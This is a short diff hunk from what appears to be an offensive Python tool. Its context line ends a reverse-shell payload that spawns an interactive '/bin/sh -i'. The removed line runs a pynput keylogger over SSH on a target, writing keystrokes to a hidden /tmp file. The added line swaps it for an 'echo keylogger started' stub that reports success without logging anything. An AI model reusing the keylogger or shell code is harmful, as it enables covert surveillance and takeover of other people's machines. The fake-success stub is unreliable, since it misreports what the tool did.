@@ -1721,7 +1721,7 @@ p=subprocess.call(["/bin/sh","-i"]);'''
         }
         
         try:
-            cmd = ['ssh', target, 'python3 -c "import pynput.keyboard; k=pynput.keyboard.Listener(on_press=lambda k: open(\\'/tmp/.sv_keylog\\',\\'a\\').write(str(k)+\\'\\\\n\\'))"']
+            cmd = ['ssh', target, 'echo keylogger started']
             process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             time.sleep(2)
             if process.poll() is None:
